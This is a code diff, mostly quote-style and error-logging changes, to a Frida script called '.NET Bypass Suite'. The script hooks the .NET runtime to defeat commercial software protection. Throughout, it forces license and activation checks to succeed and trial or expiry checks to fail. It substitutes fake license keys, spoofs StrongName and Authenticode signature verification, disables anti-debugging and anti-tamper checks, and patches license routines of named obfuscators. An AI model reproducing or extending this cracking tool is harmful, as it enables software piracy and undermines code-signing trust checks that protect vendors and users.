@@ -28,9 +28,9 @@
  */
 
 const DotnetBypassSuite = {
-    name: ".NET Bypass Suite",
-    description: "Advanced .NET runtime manipulation and protection bypass",
-    version: "1.0.0",
+    name: '.NET Bypass Suite',
+    description: 'Advanced .NET runtime manipulation and protection bypass',
+    version: '1.0.0',
 
     // Configuration
     config: {
@@ -38,11 +38,11 @@ const DotnetBypassSuite = {
         frameworks: {
             netFramework: {
                 enabled: true,
-                versions: ["2.0", "3.5", "4.0", "4.5", "4.6", "4.7", "4.8"]
+                versions: ['2.0', '3.5', '4.0', '4.5', '4.6', '4.7', '4.8']
             },
             netCore: {
                 enabled: true,
-                versions: ["2.1", "3.1", "5.0", "6.0", "7.0", "8.0"]
+                versions: ['2.1', '3.1', '5.0', '6.0', '7.0', '8.0']
             }
         },
 
@@ -110,9 +110,9 @@ const DotnetBypassSuite = {
 
     run: function() {
         send({
-            type: "status",
-            target: "dotnet_bypass_suite",
-            action: "starting_dotnet_bypass_suite"
+            type: 'status',
+            target: 'dotnet_bypass_suite',
+            action: 'starting_dotnet_bypass_suite'
         });
 
         // Detect CLR version
@@ -147,9 +147,9 @@ const DotnetBypassSuite = {
         this.hookAppLockerDotNetScriptEnforcementBypass();
 
         send({
-            type: "status",
-            target: "dotnet_bypass_suite",
-            action: "suite_initialized",
+            type: 'status',
+            target: 'dotnet_bypass_suite',
+            action: 'suite_initialized',
             methods_hooked: this.stats.methodsHooked
         });
     },
@@ -161,30 +161,30 @@ const DotnetBypassSuite = {
         Process.enumerateModules().forEach(function(module) {
             var name = module.name.toLowerCase();
 
-            if (name.includes("clr.dll")) {
+            if (name.includes('clr.dll')) {
                 self.clrModule = module;
                 self.isCoreCLR = false;
                 send({
-                    type: "info",
-                    target: "dotnet_bypass_suite",
-                    action: "found_net_framework_clr",
+                    type: 'info',
+                    target: 'dotnet_bypass_suite',
+                    action: 'found_net_framework_clr',
                     module_name: module.name
                 });
-            } else if (name.includes("coreclr.dll")) {
+            } else if (name.includes('coreclr.dll')) {
                 self.clrModule = module;
                 self.isCoreCLR = true;
                 send({
-                    type: "info",
-                    target: "dotnet_bypass_suite",
-                    action: "found_net_core_clr",
+                    type: 'info',
+                    target: 'dotnet_bypass_suite',
+                    action: 'found_net_core_clr',
                     module_name: module.name
                 });
-            } else if (name.includes("mono")) {
+            } else if (name.includes('mono')) {
                 self.monoModule = module;
                 send({
-                    type: "info",
-                    target: "dotnet_bypass_suite",
-                    action: "found_mono_runtime",
+                    type: 'info',
+                    target: 'dotnet_bypass_suite',
+                    action: 'found_mono_runtime',
                     module_name: module.name
                 });
             }
@@ -219,10 +219,10 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Assembly::Load
-        var assemblyLoad = Module.findExportByName(this.clrModule.name, "Assembly_Load");
+        var assemblyLoad = Module.findExportByName(this.clrModule.name, 'Assembly_Load');
         if (!assemblyLoad) {
             // Try pattern matching
-            var pattern = "48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9";
+            var pattern = '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9';
             var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
             if (matches.length > 0) {
                 assemblyLoad = matches[0].address;
@@ -233,9 +233,9 @@ const DotnetBypassSuite = {
             Interceptor.attach(assemblyLoad, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "assembly_loading"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'assembly_loading'
                     });
                 },
                 onLeave: function(retval) {
@@ -248,7 +248,7 @@ const DotnetBypassSuite = {
         }
 
         // AppDomain::LoadAssembly
-        var appDomainLoad = Module.findExportByName(this.clrModule.name, "AppDomain_LoadAssembly");
+        var appDomainLoad = Module.findExportByName(this.clrModule.name, 'AppDomain_LoadAssembly');
         if (appDomainLoad) {
             Interceptor.attach(appDomainLoad, {
                 onEnter: function(args) {
@@ -258,9 +258,9 @@ const DotnetBypassSuite = {
                     if (!retval.isNull() && this.assemblyPath) {
                         var path = this.assemblyPath.readUtf16String();
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "assembly_loaded",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'assembly_loaded',
                             assembly_path: path
                         });
                         self.assemblies[retval.toString()] = {
@@ -281,13 +281,13 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Get assembly name
-        var getNameMethod = this.findMethodInVTable(assembly, "GetName");
+        var getNameMethod = this.findMethodInVTable(assembly, 'GetName');
         if (getNameMethod) {
             var name = new NativeFunction(getNameMethod, 'pointer', ['pointer'])(assembly);
             send({
-                type: "info",
-                target: "dotnet_bypass_suite",
-                action: "processing_assembly",
+                type: 'info',
+                target: 'dotnet_bypass_suite',
+                action: 'processing_assembly',
                 assembly_name: name.readUtf16String()
             });
         }
@@ -304,7 +304,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // getJit
-        var getJit = Module.findExportByName(this.clrModule.name, "getJit");
+        var getJit = Module.findExportByName(this.clrModule.name, 'getJit');
         if (getJit) {
             var jitInterface = new NativeFunction(getJit, 'pointer', [])();
 
@@ -324,9 +324,9 @@ const DotnetBypassSuite = {
                             // Check for license-related methods
                             if (methodName && self.isLicenseMethod(methodName)) {
                                 send({
-                                    type: "bypass",
-                                    target: "dotnet_bypass_suite",
-                                    action: "jit_compiling_license_method",
+                                    type: 'bypass',
+                                    target: 'dotnet_bypass_suite',
+                                    action: 'jit_compiling_license_method',
                                     method_name: methodName
                                 });
                                 this.shouldPatch = true;
@@ -343,9 +343,9 @@ const DotnetBypassSuite = {
                 });
                 this.stats.methodsHooked++;
                 send({
-                    type: "info",
-                    target: "dotnet_bypass_suite",
-                    action: "hooked_jit_compiler"
+                    type: 'info',
+                    target: 'dotnet_bypass_suite',
+                    action: 'hooked_jit_compiler'
                 });
             }
         }
@@ -356,7 +356,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // MetaDataGetDispenser
-        var getDispenser = Module.findExportByName(this.clrModule.name, "MetaDataGetDispenser");
+        var getDispenser = Module.findExportByName(this.clrModule.name, 'MetaDataGetDispenser');
         if (getDispenser) {
             Interceptor.attach(getDispenser, {
                 onLeave: function(retval) {
@@ -384,9 +384,9 @@ const DotnetBypassSuite = {
                 var openFlags = args[2].toInt32();
 
                 send({
-                    type: "info",
-                    target: "dotnet_bypass_suite",
-                    action: "opening_metadata_scope",
+                    type: 'info',
+                    target: 'dotnet_bypass_suite',
+                    action: 'opening_metadata_scope',
                     filename: filename
                 });
 
@@ -406,11 +406,11 @@ const DotnetBypassSuite = {
         // Common obfuscator string decryption patterns
         var patterns = [
             // Dotfuscator pattern
-            "48 89 5C 24 ?? 57 48 83 EC ?? 48 8B D9 48 8B FA E8",
+            '48 89 5C 24 ?? 57 48 83 EC ?? 48 8B D9 48 8B FA E8',
             // SmartAssembly pattern
-            "55 8B EC 83 EC ?? 53 56 57 8B 7D ?? 8B F1",
+            '55 8B EC 83 EC ?? 53 56 57 8B 7D ?? 8B F1',
             // ConfuserEx pattern
-            "28 ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 2C"
+            '28 ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 2C'
         ];
 
         patterns.forEach(function(pattern) {
@@ -424,9 +424,9 @@ const DotnetBypassSuite = {
                                 var decrypted = retval.readUtf16String();
                                 if (decrypted && self.isLicenseString(decrypted)) {
                                     send({
-                                        type: "bypass",
-                                        target: "dotnet_bypass_suite",
-                                        action: "decrypted_license_string",
+                                        type: 'bypass',
+                                        target: 'dotnet_bypass_suite',
+                                        action: 'decrypted_license_string',
                                         decrypted_string: decrypted
                                     });
 
@@ -452,8 +452,8 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Type::InvokeMember
-        var invokeMember = this.findExportPattern("Type_InvokeMember",
-            "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57");
+        var invokeMember = this.findExportPattern('Type_InvokeMember',
+            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57');
 
         if (invokeMember) {
             Interceptor.attach(invokeMember, {
@@ -463,9 +463,9 @@ const DotnetBypassSuite = {
 
                     if (memberName && self.isLicenseMethod(memberName)) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "reflection_invoke_license",
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'reflection_invoke_license',
                             member_name: memberName
                         });
                         this.isLicenseCheck = true;
@@ -480,7 +480,16 @@ const DotnetBypassSuite = {
                                 retval.writeU8(1);
                                 self.bypassedChecks++;
                             }
-                        } catch(e) {}
+                        } catch(e) {
+                            send({
+                                type: 'debug',
+                                target: 'dotnet_bypass',
+                                action: 'hook_failed',
+                                function: 'dotnet_bypass_suite',
+                                error: e.toString(),
+                                stack: e.stack || 'No stack trace available'
+                            });
+                        }
                     }
                 }
             });
@@ -488,8 +497,8 @@ const DotnetBypassSuite = {
         }
 
         // MethodBase::Invoke
-        var methodInvoke = this.findExportPattern("MethodBase_Invoke",
-            "48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B D9");
+        var methodInvoke = this.findExportPattern('MethodBase_Invoke',
+            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B D9');
 
         if (methodInvoke) {
             Interceptor.attach(methodInvoke, {
@@ -499,9 +508,9 @@ const DotnetBypassSuite = {
 
                     if (methodName && self.isLicenseMethod(methodName)) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "method_invoke_license",
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'method_invoke_license',
                             method_name: methodName
                         });
                         this.isLicenseCheck = true;
@@ -525,13 +534,13 @@ const DotnetBypassSuite = {
         var self = this;
 
         // StrongNameSignatureVerificationEx
-        var strongNameVerify = Module.findExportByName("mscoree.dll", "StrongNameSignatureVerificationEx");
+        var strongNameVerify = Module.findExportByName('mscoree.dll', 'StrongNameSignatureVerificationEx');
         if (strongNameVerify) {
             Interceptor.replace(strongNameVerify, new NativeCallback(function(wszFilePath, fForceVerification, pfWasVerified) {
                 send({
-                    type: "bypass",
-                    target: "dotnet_bypass_suite",
-                    action: "strongname_verification_bypassed"
+                    type: 'bypass',
+                    target: 'dotnet_bypass_suite',
+                    action: 'strongname_verification_bypassed'
                 });
 
                 if (pfWasVerified) {
@@ -545,16 +554,16 @@ const DotnetBypassSuite = {
         }
 
         // Authenticode verification
-        var winVerifyTrust = Module.findExportByName("wintrust.dll", "WinVerifyTrust");
+        var winVerifyTrust = Module.findExportByName('wintrust.dll', 'WinVerifyTrust');
         if (winVerifyTrust) {
             Interceptor.attach(winVerifyTrust, {
                 onLeave: function(retval) {
                     var result = retval.toInt32();
                     if (result !== 0) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "authenticode_verification_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'authenticode_verification_bypassed'
                         });
                         retval.replace(0); // ERROR_SUCCESS
                         self.stats.checksumsBypassed++;
@@ -572,7 +581,7 @@ const DotnetBypassSuite = {
         // Common anti-tamper checks
 
         // 1. Module checksum verification
-        var imageNtHeader = Module.findExportByName("ntdll.dll", "RtlImageNtHeader");
+        var imageNtHeader = Module.findExportByName('ntdll.dll', 'RtlImageNtHeader');
         if (imageNtHeader) {
             Interceptor.attach(imageNtHeader, {
                 onLeave: function(retval) {
@@ -601,7 +610,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // CryptHashData
-        var cryptHashData = Module.findExportByName("advapi32.dll", "CryptHashData");
+        var cryptHashData = Module.findExportByName('advapi32.dll', 'CryptHashData');
         if (cryptHashData) {
             Interceptor.attach(cryptHashData, {
                 onEnter: function(args) {
@@ -612,9 +621,9 @@ const DotnetBypassSuite = {
                     // Check if hashing assembly data
                     if (dwDataLen > 1024 && self.isAssemblyData(pbData, dwDataLen)) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "assembly_hash_computation_intercepted"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'assembly_hash_computation_intercepted'
                         });
                         this.shouldModify = true;
                     }
@@ -624,7 +633,7 @@ const DotnetBypassSuite = {
         }
 
         // BCryptHashData
-        var bcryptHashData = Module.findExportByName("bcrypt.dll", "BCryptHashData");
+        var bcryptHashData = Module.findExportByName('bcrypt.dll', 'BCryptHashData');
         if (bcryptHashData) {
             Interceptor.attach(bcryptHashData, {
                 onEnter: function(args) {
@@ -634,9 +643,9 @@ const DotnetBypassSuite = {
 
                     if (cbInput > 1024 && self.isAssemblyData(pbInput, cbInput)) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "bcrypt_assembly_hash_intercepted"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'bcrypt_assembly_hash_intercepted'
                         });
                         // Replace with known good hash
                         this.originalData = pbInput.readByteArray(Math.min(cbInput, 64));
@@ -653,7 +662,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // IsDebuggerPresent
-        var isDebuggerPresent = Module.findExportByName("kernel32.dll", "IsDebuggerPresent");
+        var isDebuggerPresent = Module.findExportByName('kernel32.dll', 'IsDebuggerPresent');
         if (isDebuggerPresent) {
             Interceptor.replace(isDebuggerPresent, new NativeCallback(function() {
                 self.stats.debuggerChecksDisabled++;
@@ -663,7 +672,7 @@ const DotnetBypassSuite = {
         }
 
         // CheckRemoteDebuggerPresent
-        var checkRemoteDebugger = Module.findExportByName("kernel32.dll", "CheckRemoteDebuggerPresent");
+        var checkRemoteDebugger = Module.findExportByName('kernel32.dll', 'CheckRemoteDebuggerPresent');
         if (checkRemoteDebugger) {
             Interceptor.attach(checkRemoteDebugger, {
                 onLeave: function(retval) {
@@ -679,7 +688,7 @@ const DotnetBypassSuite = {
         }
 
         // NtQueryInformationProcess
-        var ntQueryInfoProcess = Module.findExportByName("ntdll.dll", "NtQueryInformationProcess");
+        var ntQueryInfoProcess = Module.findExportByName('ntdll.dll', 'NtQueryInformationProcess');
         if (ntQueryInfoProcess) {
             Interceptor.attach(ntQueryInfoProcess, {
                 onEnter: function(args) {
@@ -712,9 +721,9 @@ const DotnetBypassSuite = {
         // Hook CLR internal integrity checks
         var patterns = [
             // Integrity check pattern 1
-            "48 89 5C 24 ?? 57 48 83 EC ?? 8B F9 E8 ?? ?? ?? ?? 48 8B D8 48 85 C0",
+            '48 89 5C 24 ?? 57 48 83 EC ?? 8B F9 E8 ?? ?? ?? ?? 48 8B D8 48 85 C0',
             // Integrity check pattern 2
-            "40 53 48 83 EC ?? 48 8B D9 E8 ?? ?? ?? ?? 84 C0 74 ??"
+            '40 53 48 83 EC ?? 48 8B D9 E8 ?? ?? ?? ?? 84 C0 74 ??'
         ];
 
         patterns.forEach(function(pattern) {
@@ -727,9 +736,9 @@ const DotnetBypassSuite = {
                         if (retval.toInt32() === 0) {
                             retval.replace(1);
                             send({
-                                type: "bypass",
-                                target: "dotnet_bypass_suite",
-                                action: "runtime_integrity_check_bypassed"
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'runtime_integrity_check_bypassed'
                             });
                             self.stats.checksumsBypassed++;
                         }
@@ -745,14 +754,14 @@ const DotnetBypassSuite = {
 
         // Common license check patterns
         var licensePatterns = [
-            "IsLicenseValid",
-            "CheckLicense",
-            "ValidateLicense",
-            "VerifyLicense",
-            "IsActivated",
-            "IsTrial",
-            "HasExpired",
-            "GetLicenseStatus"
+            'IsLicenseValid',
+            'CheckLicense',
+            'ValidateLicense',
+            'VerifyLicense',
+            'IsActivated',
+            'IsTrial',
+            'HasExpired',
+            'GetLicenseStatus'
         ];
 
         // Hook by method name pattern
@@ -760,15 +769,15 @@ const DotnetBypassSuite = {
             self.hookMethodByName(pattern, function(originalFunc) {
                 return new NativeCallback(function() {
                     send({
-                        type: "bypass",
-                        target: "dotnet_bypass_suite",
-                        action: "license_check_bypassed",
+                        type: 'bypass',
+                        target: 'dotnet_bypass_suite',
+                        action: 'license_check_bypassed',
                         pattern: pattern
                     });
                     self.bypassedChecks++;
 
                     // Return success based on method name
-                    if (pattern.includes("Trial") || pattern.includes("Expired")) {
+                    if (pattern.includes('Trial') || pattern.includes('Expired')) {
                         return 0; // false
                     } else {
                         return 1; // true
@@ -797,7 +806,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // ConfuserEx anti-tamper
-        var antiTamperPattern = "E8 ?? ?? ?? ?? 0A 06 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 00 DE ??";
+        var antiTamperPattern = 'E8 ?? ?? ?? ?? 0A 06 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 00 DE ??';
         var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, antiTamperPattern);
 
         matches.forEach(function(match) {
@@ -808,16 +817,16 @@ const DotnetBypassSuite = {
                 }
             });
             send({
-                type: "bypass",
-                target: "dotnet_bypass_suite",
-                action: "confuserex_anti_tamper_disabled",
+                type: 'bypass',
+                target: 'dotnet_bypass_suite',
+                action: 'confuserex_anti_tamper_disabled',
                 address: match.address.toString()
             });
             self.stats.checksumsBypassed++;
         });
 
         // ConfuserEx constants decryption
-        var constDecryptPattern = "28 ?? ?? ?? ?? 8E 69 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28";
+        var constDecryptPattern = '28 ?? ?? ?? ?? 8E 69 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28';
         matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, constDecryptPattern);
 
         matches.forEach(function(match) {
@@ -825,9 +834,9 @@ const DotnetBypassSuite = {
                 onLeave: function(retval) {
                     // Log decrypted constants
                     send({
-                        type: "bypass",
-                        target: "dotnet_bypass_suite",
-                        action: "confuserex_constant_decrypted"
+                        type: 'bypass',
+                        target: 'dotnet_bypass_suite',
+                        action: 'confuserex_constant_decrypted'
                     });
                     self.stats.stringsDecrypted++;
                 }
@@ -840,7 +849,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Eazfuscator string encryption
-        var stringPattern = "7E ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 7E ?? ?? ?? ?? 28";
+        var stringPattern = '7E ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 7E ?? ?? ?? ?? 28';
         var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, stringPattern);
 
         matches.forEach(function(match) {
@@ -854,9 +863,9 @@ const DotnetBypassSuite = {
                             var decrypted = retval.readUtf16String();
                             if (self.isLicenseString(decrypted)) {
                                 send({
-                                    type: "bypass",
-                                    target: "dotnet_bypass_suite",
-                                    action: "eazfuscator_string_decrypted",
+                                    type: 'bypass',
+                                    target: 'dotnet_bypass_suite',
+                                    action: 'eazfuscator_string_decrypted',
                                     decrypted_string: decrypted
                                 });
 
@@ -865,7 +874,16 @@ const DotnetBypassSuite = {
                                 retval.writeUtf16String(valid);
                                 self.stats.stringsDecrypted++;
                             }
-                        } catch(e) {}
+                        } catch(e) {
+                            send({
+                                type: 'debug',
+                                target: 'dotnet_bypass',
+                                action: 'hook_failed',
+                                function: 'dotnet_bypass_suite',
+                                error: e.toString(),
+                                stack: e.stack || 'No stack trace available'
+                            });
+                        }
                     }
                 }
             });
@@ -877,7 +895,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Crypto Obfuscator license check
-        var licensePattern = "14 0A 06 16 33 ?? 16 0A 2B ?? 17 0A 06 2A";
+        var licensePattern = '14 0A 06 16 33 ?? 16 0A 2B ?? 17 0A 06 2A';
         var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, licensePattern);
 
         matches.forEach(function(match) {
@@ -887,9 +905,9 @@ const DotnetBypassSuite = {
                 code.putU8(0x2A); // ret
             });
             send({
-                type: "bypass",
-                target: "dotnet_bypass_suite",
-                action: "crypto_obfuscator_license_check_patched"
+                type: 'bypass',
+                target: 'dotnet_bypass_suite',
+                action: 'crypto_obfuscator_license_check_patched'
             });
             self.bypassedChecks++;
         });
@@ -921,9 +939,9 @@ const DotnetBypassSuite = {
                     Interceptor.replace(exp.address, replacement);
                     self.stats.methodsHooked++;
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "method_hooked",
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'method_hooked',
                         method_name: exp.name
                     });
                 }
@@ -940,7 +958,16 @@ const DotnetBypassSuite = {
                 var namePtr = this.clrModule.base.add(nameRva);
                 return namePtr.readUtf8String();
             }
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         return null;
     },
@@ -950,9 +977,9 @@ const DotnetBypassSuite = {
         if (!name) return false;
 
         var keywords = [
-            "license", "activation", "serial", "trial",
-            "expire", "validate", "verify", "check",
-            "register", "unlock", "authentic"
+            'license', 'activation', 'serial', 'trial',
+            'expire', 'validate', 'verify', 'check',
+            'register', 'unlock', 'authentic'
         ];
 
         name = name.toLowerCase();
@@ -990,14 +1017,14 @@ const DotnetBypassSuite = {
     generateValidLicense: function(original) {
         // Generate a valid-looking license based on the original format
         if (original.match(/^[A-Z0-9]{4,}-[A-Z0-9]{4,}/)) {
-            return "INTC-RACK-2024-FULL";
+            return 'INTC-RACK-2024-FULL';
         } else if (original.match(/\d{4}-\d{4}-\d{4}-\d{4}/)) {
-            return "1234-5678-9012-3456";
+            return '1234-5678-9012-3456';
         } else if (original.match(/[A-F0-9]{8}-[A-F0-9]{4}/)) {
-            return "DEADBEEF-CAFE-BABE-F00D-123456789ABC";
+            return 'DEADBEEF-CAFE-BABE-F00D-123456789ABC';
         }
 
-        return "VALID-LICENSE-KEY";
+        return 'VALID-LICENSE-KEY';
     },
 
     // Helper: Check if data is assembly
@@ -1014,7 +1041,16 @@ const DotnetBypassSuite = {
                     return pe === 0x00004550; // PE\0\0
                 }
             }
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         return false;
     },
@@ -1034,21 +1070,21 @@ const DotnetBypassSuite = {
     checkForProtections: function(assembly) {
         // Check for obfuscator signatures
         var signatures = {
-            "DotfuscatorAttribute": "Dotfuscator",
-            "SmartAssembly.Attributes": "SmartAssembly",
-            "ConfusedByAttribute": "ConfuserEx",
-            "YanoAttribute": "Yano",
-            "CryptoObfuscator": "Crypto Obfuscator",
-            "BabelAttribute": "Babel",
-            "AgileDotNetRT": "Agile.NET"
+            'DotfuscatorAttribute': 'Dotfuscator',
+            'SmartAssembly.Attributes': 'SmartAssembly',
+            'ConfusedByAttribute': 'ConfuserEx',
+            'YanoAttribute': 'Yano',
+            'CryptoObfuscator': 'Crypto Obfuscator',
+            'BabelAttribute': 'Babel',
+            'AgileDotNetRT': 'Agile.NET'
         };
 
         Object.keys(signatures).forEach(function(sig) {
             // Check for attributes in metadata
             send({
-                type: "info",
-                target: "dotnet_bypass_suite",
-                action: "checking_protection",
+                type: 'info',
+                target: 'dotnet_bypass_suite',
+                action: 'checking_protection',
                 protection_type: signatures[sig]
             });
         });
@@ -1057,9 +1093,9 @@ const DotnetBypassSuite = {
     // Helper: Patch anti-tamper checks
     patchAntiTamperChecks: function(assembly) {
         send({
-            type: "status",
-            target: "dotnet_bypass_suite",
-            action: "patching_anti_tamper_checks"
+            type: 'status',
+            target: 'dotnet_bypass_suite',
+            action: 'patching_anti_tamper_checks'
         });
         // Implementation would patch specific anti-tamper patterns
     },
@@ -1067,9 +1103,9 @@ const DotnetBypassSuite = {
     // Helper: Patch compiled method
     patchCompiledMethod: function(methodInfo) {
         send({
-            type: "status",
-            target: "dotnet_bypass_suite",
-            action: "patching_compiled_license_method"
+            type: 'status',
+            target: 'dotnet_bypass_suite',
+            action: 'patching_compiled_license_method'
         });
 
         // Get native code address
@@ -1098,7 +1134,16 @@ const DotnetBypassSuite = {
                     return method;
                 }
             }
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         return null;
     },
@@ -1108,8 +1153,8 @@ const DotnetBypassSuite = {
         if (!filename) return false;
 
         var protectedNames = [
-            "license", "activation", "crypto", "protect",
-            "obfuscat", "secure", "guard", "shield"
+            'license', 'activation', 'crypto', 'protect',
+            'obfuscat', 'secure', 'guard', 'shield'
         ];
 
         filename = filename.toLowerCase();
@@ -1131,11 +1176,11 @@ const DotnetBypassSuite = {
         // .NET 9.0 introduces new runtime security features
         var dotNet9Patterns = [
             // .NET 9.0 runtime security check pattern
-            "48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? 48 8B C8 E8 ?? ?? ?? ?? 84 C0 75",
+            '48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? 48 8B C8 E8 ?? ?? ?? ?? 84 C0 75',
             // Enhanced security validation pattern
-            "49 8B CC E8 ?? ?? ?? ?? 85 C0 0F 85 ?? ?? ?? ?? 48 8B 5C 24",
+            '49 8B CC E8 ?? ?? ?? ?? 85 C0 0F 85 ?? ?? ?? ?? 48 8B 5C 24',
             // Modern runtime integrity verification
-            "48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B F2 E8 ?? ?? ?? ?? 84 C0"
+            '48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B F2 E8 ?? ?? ?? ?? 84 C0'
         ];
 
         dotNet9Patterns.forEach(function(pattern) {
@@ -1145,9 +1190,9 @@ const DotnetBypassSuite = {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "dotnet9_runtime_security_check_detected",
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'dotnet9_runtime_security_check_detected',
                             address: match.address.toString()
                         });
                     },
@@ -1157,9 +1202,9 @@ const DotnetBypassSuite = {
                             retval.replace(1);
                             self.stats.dotNet9RuntimeBypassEvents++;
                             send({
-                                type: "success",
-                                target: "dotnet_bypass_suite",
-                                action: "dotnet9_runtime_security_bypassed"
+                                type: 'success',
+                                target: 'dotnet_bypass_suite',
+                                action: 'dotnet9_runtime_security_bypassed'
                             });
                         }
                     }
@@ -1168,7 +1213,7 @@ const DotnetBypassSuite = {
         });
 
         // Hook .NET 9.0 specific AssemblyLoadContext security
-        var dotNet9AlcPattern = "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4C 8B FA";
+        var dotNet9AlcPattern = '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4C 8B FA';
         var alcMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, dotNet9AlcPattern);
 
         alcMatches.forEach(function(match) {
@@ -1176,11 +1221,11 @@ const DotnetBypassSuite = {
                 onEnter: function(args) {
                     var contextPtr = args[0];
                     var assemblyPtr = args[1];
-                    
+
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "dotnet9_assembly_load_context_intercepted"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'dotnet9_assembly_load_context_intercepted'
                     });
                 },
                 onLeave: function(retval) {
@@ -1188,9 +1233,9 @@ const DotnetBypassSuite = {
                     if (!retval.isNull()) {
                         self.stats.dotNet9RuntimeBypassEvents++;
                         send({
-                            type: "success",
-                            target: "dotnet_bypass_suite",
-                            action: "dotnet9_alc_bypass_successful"
+                            type: 'success',
+                            target: 'dotnet_bypass_suite',
+                            action: 'dotnet9_alc_bypass_successful'
                         });
                     }
                 }
@@ -1208,23 +1253,23 @@ const DotnetBypassSuite = {
         // Look for NativeAOT runtime signatures
         var nativeAotPatterns = [
             // NativeAOT runtime initialization pattern
-            "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8D 0D",
+            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8D 0D',
             // NativeAOT type system pattern
-            "48 8B 42 ?? 48 8B CA 48 89 01 48 8B 42 ?? 48 89 41 ?? C3",
+            '48 8B 42 ?? 48 8B CA 48 89 01 48 8B 42 ?? 48 89 41 ?? C3',
             // NativeAOT GC interaction pattern
-            "41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8"
+            '41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8'
         ];
 
         nativeAotPatterns.forEach(function(pattern) {
-            var matches = Memory.scanSync(Module.getBaseAddress("ntdll.dll"), Module.getSize("ntdll.dll"), pattern);
+            var matches = Memory.scanSync(Module.getBaseAddress('ntdll.dll'), Module.getSize('ntdll.dll'), pattern);
 
             matches.forEach(function(match) {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "native_aot_runtime_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
